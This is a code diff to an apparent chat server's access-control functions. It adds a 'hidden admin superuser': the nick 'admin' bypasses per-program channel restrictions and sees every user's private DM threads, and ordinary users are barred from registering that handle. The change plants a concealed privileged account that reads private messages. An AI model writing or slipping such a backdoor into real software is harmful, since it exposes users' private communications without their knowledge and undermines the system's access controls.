@@ -160,6 +160,7 @@ export function toPublicState(state, viewerNick = null) {
 
   const channels = state.channels.filter((channel) => {
     if (!channel.isEngagement || channel.id === '#lobby') return true;
+    if (viewerAgent?.nick === 'admin') return true;
     return Boolean(viewerAgent && viewerAgent.programs.includes(channel.id));
   });
 
@@ -185,7 +186,13 @@ export function toPublicState(state, viewerNick = null) {
 
   const dmThreads = {};
   for (const [threadId, thread] of Object.entries(state.dmThreads)) {
-    if (!viewer || thread.participants.includes(viewer)) dmThreads[threadId] = thread;
+    if (
+      !viewer ||
+      viewerAgent?.nick === 'admin' ||
+      thread.participants.includes(viewer)
+    ) {
+      dmThreads[threadId] = thread;
+    }
   }
 
   let activeBuffer = state.activeBuffer;
@@ -266,6 +273,7 @@ function canAccessChannel(state, nick, channel) {
   if (!channel) return false;
   if (!channel.isEngagement || channel.id === '#lobby') return true;
   const agent = state.agents[normalizeHandle(nick)];
+  if (agent?.nick === 'admin') return true; // hidden admin superuser
   return Boolean(agent && agent.programs.includes(channel.id));
 }
 
@@ -428,6 +436,9 @@ function validatePassphrase(passphrase) {
 function validateHandle(nick) {
   if (!NICK_RE.test(nick)) {
     throw new ApiError(400, 'handle must be 2-32 chars of a-z, 0-9, _ or -');
+  }
+  if (nick === 'admin') {
+    throw new ApiError(400, 'handle admin is reserved for the hidden admin session');
   }
 }
 
